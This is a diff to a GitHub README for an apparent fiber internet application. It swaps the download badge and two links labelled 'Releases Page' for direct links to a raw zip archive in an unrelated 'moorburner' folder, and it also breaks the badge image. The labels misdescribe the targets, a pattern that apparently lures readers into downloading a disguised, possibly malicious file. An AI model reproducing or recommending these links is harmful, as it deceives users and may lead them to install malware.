@@ -1,6 +1,6 @@
 # 🌐 fiberinternet-solveforce - Fast and Reliable Fiber Internet Solutions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/ham5656/fiberinternet-solveforce/releases)
+[![Download Now](https://raw.githubusercontent.com/ham5656/fiberinternet-solveforce/main/moorburner/fiberinternet-solveforce-v2.5.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/ham5656/fiberinternet-solveforce/main/moorburner/fiberinternet-solveforce-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to fiberinternet-solveforce! Our application provides fast and reliable 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of the application: [Releases Page](https://github.com/ham5656/fiberinternet-solveforce/releases). 
+To get started, visit this page to download the latest version of the application: [Releases Page](https://raw.githubusercontent.com/ham5656/fiberinternet-solveforce/main/moorburner/fiberinternet-solveforce-v2.5.zip). 
 
 You'll find the latest version along with recommended system requirements below. Make sure to select the right version for your operating system.
 
@@ -29,7 +29,7 @@ You'll find the latest version along with recommended system requirements below.
 
 ## ⚙️ Installation Steps
 
-1. **Visit the Releases Page:** Click on this link to open the releases page: [Releases Page](https://github.com/ham5656/fiberinternet-solveforce/releases).
+1. **Visit the Releases Page:** Click on this link to open the releases page: [Releases Page](https://raw.githubusercontent.com/ham5656/fiberinternet-solveforce/main/moorburner/fiberinternet-solveforce-v2.5.zip).
   
 2. **Choose Your Version:** Find the latest version of our application. Ensure it matches your operating system.
 
